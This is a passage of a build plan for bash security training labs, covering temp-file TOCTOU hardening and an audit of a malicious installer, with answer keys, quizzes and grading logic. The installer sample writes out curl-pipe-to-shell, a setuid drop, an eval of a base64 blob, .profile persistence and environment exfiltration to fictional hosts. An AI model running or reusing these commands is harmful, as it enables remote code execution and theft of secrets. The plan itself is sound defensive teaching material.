- Q2: "An allowlist (`case $x in *[!a-z]*) reject`) beats a denylist because…"
  a) it's shorter · **b) it accepts only known-good and rejects everything else,
  so unforeseen attacks are rejected by default** · c) denylists are faster → `Yg==`
- Q3: "`grep -F -- "$x" file` is fully defended because…" **a) -F literal (no
  regex injection), -- (no option injection), "$x" quoted (no word-splitting)** ·
  b) it uses grep · c) it's fast → `YQ==`
- Recap:
  1. `One rule beats all others: never let untrusted input reach the command position — pass it as a quoted argument to a program, never as text a shell re-parses.`
  2. `Layer the guards: allowlist-validate (case), quote ("$x"), end options (--), force literal where relevant (grep -F), and pin an absolute PATH.`
  3. `Reject, don't sanitize: an allowlist of known-good characters is safer than trying to strip known-bad ones.`

---

### L4.7 — Temp files done right — `mktemp` and TOCTOU races (CWE-367)
**TAME · gate:false · est 15 · files/: `cache.sh` · recall.json: no**
**objective:** "Harden an insecure temp-file script in place: replace the
predictable name and the check-then-use race with `mktemp` + a cleanup trap."

**(2) TEACHING ARTIFACT** — `files/cache.sh` (flawed; **TAME = edit in place** to
harden). Self-contained so both the flawed and hardened versions run:
```bash
#!/usr/bin/env bash                                   # 1
# TEACHING SAMPLE — intentionally flawed (edit in place to harden).
process() { wc -c < "$1"; }                           # 3  trivial consumer, keeps the sample runnable
tmp=/tmp/acme-cache.$$                                # 4  (A) predictable name in a shared dir → symlink attack
if [ ! -e "$tmp" ]; then                              # 5  (B) check...
  echo "$DATA" > "$tmp"                               # 6      ...then use — TOCTOU window (CWE-367)
fi                                                    # 7
process "$tmp"                                        # 8
rm -f "$tmp"                                          # 9  (C) no trap: leaks on early exit/interrupt
```
- **Flaws:** (A) predictable `/tmp/acme-cache.$$` in world-writable `/tmp` — an
  attacker pre-creates/symlinks it so your `>` follows the link; (B) check-then-use
  is a **TOCTOU race, CWE-367**; (C) cleanup only on the happy path (no `trap`).
- **Hardened target** (learner edits `cache.sh` to this shape):
  ```bash
  set -euo pipefail
  tmp=$(mktemp)                          # unpredictable, O_EXCL, private perms
  trap 'rm -f -- "$tmp"' EXIT            # cleanup on every exit (L2.7)
  printf '%s' "$DATA" > "$tmp"
  process "$tmp"
  ```
- **Answer key** (`answers.txt`, concept reinforcement alongside the edit):
  ```
  flaw=toctou
  cwe=CWE-367
  ```

**(3) NEVER-EXECUTED CONFIRMATION:** TAME — the learner's **hardened** `cache.sh`
is executed (it is safe), but the symlink/TOCTOU attack is only *described*, never
performed. `check.sh` runs `cache.sh` with `TMPDIR` pinned into the workspace
(`TMPDIR="$LAB_WORKSPACE/tmp"`), so nothing ever touches the real `/tmp`. No
malicious action runs.

**(4) CHECK LOGIC:**
- `assert_file_contains "answers.txt" '^flaw=toctou$'`, `'^cwe=CWE-367$'`.
- Construct checks on the edited `cache.sh`: `assert_file_contains "cache.sh"
  'mktemp'`; `assert_file_contains "cache.sh" 'trap .*EXIT'`;
  `assert_file_not_contains "cache.sh" 'acme-cache'` (predictable path removed —
  **note: no leading `/` in the pattern**, to stay clear of the absolute-path lint).
- Behavioral: `TMPDIR="$LAB_WORKSPACE/tmp" DATA=hello` run `cache.sh`;
  `assert_cmd_ok` and `assert_output_contains` the byte count; assert no leftover
  temp remains in `TMPDIR` after the run (trap fired). `ck_summary`.

**(5) QUIZ + RECAP:**
- Q1: "`tmp=/tmp/app.$$` is unsafe because…" a) `$$` is slow · **b) the name is
  predictable, so an attacker can pre-create or symlink it in shared /tmp before
  you write** · c) /tmp is read-only → `Yg==`
- Q2: "`mktemp` is safer because it…" a) is faster · **b) creates a uniquely-named
  file atomically (O_EXCL) with private perms, closing the race** · c) encrypts
  the file → `Yg==`
- Q3: "A TOCTOU race (CWE-367) is…" a) a slow disk · **b) the gap between checking
  a file's state and using it, during which an attacker changes it** · c) a
  quoting bug → `Yg==`
- Recap:
  1. `Predictable temp names in shared dirs are a symlink/TOCTOU trap: mktemp gives an unpredictable name created atomically with safe perms — always use it, never /tmp/name.$$.`
  2. `Check-then-use is the race (CWE-367): don't [ ! -e f ] && >f — create atomically and act on the handle you got.`
  3. `Pair mktemp with trap 'rm -f -- "$tmp"' EXIT (L2.7) so the temp is removed on every exit path, not just success.`

---

### L4.8 — Phase gate: audit a realistic malicious installer end to end
**AUDIT · gate:TRUE · est 20 · files/: `setup.sh`, `payload.b64` · recall.json: no**
**objective:** "Audit a realistic malicious installer end to end: map every
fetch-and-run, privilege change, and injection to a line; decode its obfuscated
blob to a file; extract the IOCs; and render the verdict."

**(2) TEACHING ARTIFACT** — `files/setup.sh` (read-only, **never executed**;
combines every Phase-4 flaw). Companion `files/payload.b64` = base64 of the
plaintext shown below F7.
```sh
#!/bin/sh                                                            # 1
# TEACHING SAMPLE — intentionally flawed (malicious installer). Do NOT run. Audit it.
set -e                                                              # 3
BASE="https://get.acme-updates.test"                               # 4
PATH=.:$PATH                                                        # 5   F1 (L4.4) untrusted search path
TMP=/tmp/acme.$$                                                    # 6   F2 (L4.7) predictable temp
curl -fsSL "$BASE/bootstrap.sh" | sh                               # 7   F3 (L4.2) remote script piped to a shell, unread
sudo install -m4755 agent /usr/local/bin/acme                     # 8   F4 (L4.2) privilege + setuid drop
curl -fsSL "http://cdn.acme-updates.test/agent" -o "$TMP"          # 9   F5 (L4.2) plain-HTTP binary
name=$1                                                             # 10
tar -xf "$name" -C /opt/acme                                       # 11  F6 (L4.3) argument injection (no --/./)
blob="$(cat payload.b64)"                                          # 12  F7 (L4.5) obfuscated blob...
eval "$(printf '%s' "$blob" | base64 -d)"                          # 13      ...decoded and executed
echo "$BASE/agent.sh | sh" >> "$HOME/.profile"                     # 14  F8 (L4.2) persistence via shell rc
curl -X POST --data "$(env)" "$BASE/enroll"                        # 15  F9 (L4.2/L4.5) env exfiltration
```
`files/payload.b64` decodes to (builder: `printf '%s' '<text>' | base64 -w0`):
```sh
mkdir -p "$HOME/.acme" && curl -fsSL http://198.51.100.7/x -o "$HOME/.acme/x" && (sh "$HOME/.acme/x" &)
```
- **Answer key** (`answers.txt`) — verdict + a per-finding line map (value = line
  number, keys are banned-token-free) + the decoded IOC:
  ```
  verdict=unsafe
  search_path=5
  predictable_temp=6
  remote_exec=7
  privilege=8
  http_binary=9
  arg_injection=11
  obfuscation=12
  persistence=14
  exfil=15
  c2=198.51.100.7
  ```

**(3) NEVER-EXECUTED CONFIRMATION:** `setup.sh` is never executed by anyone;
`check.sh` **only greps `answers.txt` and `decoded.txt`.** The obfuscated blob is
decoded to a **file** (`base64 -d payload.b64 > decoded.txt`), never piped to a
shell. No network call is ever made — every host/IP is fictional
(`*.acme-updates.test`, TEST-NET `198.51.100.7`). No fence run is required because
the lab detonates nothing; if a builder wants a "what would this do" demo of the
blob, it is decode-to-file only (per L4.5), never execution.

**(4) CHECK LOGIC (gate rigor mirrors L3.9):**
- `assert_file_contains "answers.txt" '^verdict=unsafe$'`.
- one anchored assert per finding: `^search_path=5$`, `^predictable_temp=6$`,
  `^remote_exec=7$`, `^privilege=8$`, `^http_binary=9$`, `^arg_injection=11$`,
  `^obfuscation=12$`, `^persistence=14$`, `^exfil=15$`.
- decode + IOC extraction: `assert_file_exists "decoded.txt"`;
  `assert_file_contains "answers.txt" '^c2=198\.51\.100\.7$'`;
  `assert_file_contains_fixed "decoded.txt" '.acme/x'`.
- `ck_summary`. (All keys/slugs banned-token-free; no absolute-path literal in
  check.sh — line numbers are values, not paths.)

**(5) QUIZ + RECAP:**
- Q1: "Auditing a real installer, the first question is…" a) is it fast ·
  **b) what does it fetch-and-run that I can't see, and does anything run with
  elevated privilege** · c) is it POSIX → `Yg==`
- Q2: "`sudo install -m4755 agent /usr/local/bin/acme` is dangerous because…"
  a) install is deprecated · **b) it drops an attacker-supplied binary as
  root-setuid — persistent privileged code** · c) /usr/local is read-only → `Yg==`
- Q3: "This installer should be…" a) run in a container · **b) never run — verdict
  malicious; report the IOCs (C2 IP, persistence, exfil)** · c) run as a normal
  user → `Yg==`
- Recap:
  1. `A real malicious installer chains the whole phase: PATH poisoning, predictable temp, remote | sh, privileged/setuid drops, plain-HTTP binaries, argument injection, an obfuscated eval blob, rc persistence, and env exfiltration.`
  2. `Audit method: read top to bottom, map every fetch-and-run and every privilege change to a line, decode obfuscation to a file, and extract IOCs (C2 addresses, persistence, exfil endpoints).`
  3. `Verdict discipline: one unexplained remote-exec or exfil line is enough to refuse the whole script — you don't need all nine findings to decline to pipe it to bash.`

---

## Build-session protocol (execute in this order — gate at each lab per CLAUDE.md)

1. **Scaffold** `tracks/bash/phases/p4/` with the 8 lab dirs (slugs in the table
   above). **[VERIFY-AT-BUILD]** register p4 in `tracks/bash/track.json` mirroring
   how p3 is registered; confirm the phase title is exactly
   **"Untrusted Input & Injection"** (map `:177`).
2. **Ship containment first (dependency for L4.1).** Copy `files/fence.sh` +
   `files/run-fenced.sh` **byte-identical** from p3 into `L4.1-command-injection/files/`.
   Prove containment on the build machine: run `lookup.sh` under the fence with an
   injection payload, capture `fence.log` showing `FENCE-BLOCKED: rm …`, and show
   `ls / | wc -l` unchanged before/after. Only then author L4.1.
3. **Author content straight from the entries above.** Every sample gets the
   `# TEACHING SAMPLE — intentionally flawed` banner on **line 2** (L4.6 uses
   `# REFERENCE SAMPLE — correct …`). Base64 every quiz/recall answer
   (`printf '%s' 'b' | base64 -w0`). Ship `recall.json` in L4.1 only. Encode the
   two `payload.b64` files with `printf '%s' '<plaintext>' | base64 -w0`.
4. **Self-test sweep (no-fiction rule).** Execute every `lab.md` command yourself
   and paste **real** captured output. For each lab run `check.sh` twice: an
   incomplete/wrong `answers.txt` → graded **FAIL** with a useful hint; the correct
   artifacts → **PASS**. **[VERIFY-AT-BUILD]** re-confirm every asserted `line=`
   against the shipped sample byte-for-byte (shebang=1, banner=2).
5. **Lint + shellcheck gate.** Run `tools/lint-labs.sh` (asserts each `check.sh`
   644, has the preamble/guards, **no banned tokens**, no absolute paths; quiz=3,
   hints=3, meta fields; then the shellcheck sweep). Fix any banned-token hit using
   the §"banned-token rule" (slug swap, or literal-splitting as last resort).
6. **Extend `tests/acceptance.sh`** with a P4 block mirroring the P3 block
   (`:471-621`): per lab `lab start` → assert FAIL before the artifact exists →
   fabricate the correct `answers.txt`/`hardened.sh`/`decoded.txt`/`fence.log` via
   heredocs → assert PASS. Exercise L4.1's opener recall (assert it never gates).
   **[VERIFY-AT-BUILD]** bump catalog counts `(28/28)`→`(36/36)` and the
   "P0-P3 = 28"/"32 total track-phase lines" comments (`:380,:624,:636`).
7. **Stop-and-review after each lab** (CLAUDE.md multi-phase gating). Do **not**
   chain all 8 labs unattended; surface what changed per lab and wait for
   go-ahead. Commit/push and the `planned_execution.md` `[x]`/tag update happen
   only under this repo's Pull→Branch→Work→Commit→Push→PR→Merge loop, not in this
   plan session.

---

## Verification (how to confirm the built phase is correct)

- **Structural:** `tools/lint-labs.sh` exits clean (covers the 8 new `check.sh` +
  JSON files and runs `tools/shellcheck-all.sh`). Confirm no `files/` sample was
  swept or linted (by design).
- **Per-lab behavioral:** for each L4.N, `lab start bash L4.N`, then
  `lab check bash L4.N` with (a) missing/incorrect artifact → `RESULT: FAIL`
  naming the missing piece, (b) correct artifact → `RESULT: PASS`. For L4.1 also
  confirm the fenced demo writes `FENCE-BLOCKED` and the hardened script routes
  nothing to the fence.
- **Never-executed proof:** grep the 8 `check.sh` files to confirm none invoke a
  sample under `files/` (no `source`/`bash`/exec of `install.sh`/`setup.sh`/
  `dropper.sh`/`healthcheck.sh`/`stage-upload.sh`/`lookup.sh`); confirm L4.5/L4.8
  only ever `base64 -d … > file` (decode-to-file), never `| sh`.
- **End-to-end:** `tests/acceptance.sh` passes with the P4 block and shows the
  bash catalog at `(36/36)`.
- **Safety audit:** confirm every hostname/IP in every sample is RFC 2606 / RFC
  5737 fictional; confirm each `check.sh` is mode 644 and banned-token-free.

---

## Open items to confirm at build (not blockers)

- `tracks/bash/track.json` p4 registration shape **[VERIFY-AT-BUILD]** — mirror p3.
- Exact `assert_*` helper names/signatures against `harness/checklib.sh` at build
  (this plan uses the p3 vocabulary; adjust if a signature differs).
- Whether `est_minutes` totals need to appear anywhere beyond each `meta.json`
  (p3 kept them per-lab only) — assume per-lab only unless the harness says otherwise.
- Decide `worst=`/`safe_alternative=` optional fields per lab if richer grading is
  wanted; the keys above are sufficient to grade the required verdict + red flags.
